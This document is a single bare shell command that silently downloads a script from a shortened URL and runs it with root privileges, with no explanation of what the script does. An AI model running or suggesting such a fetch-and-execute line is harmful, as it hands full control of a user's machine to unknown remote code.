wget -qO ee rt.cx/ee4 && sudo bash ee

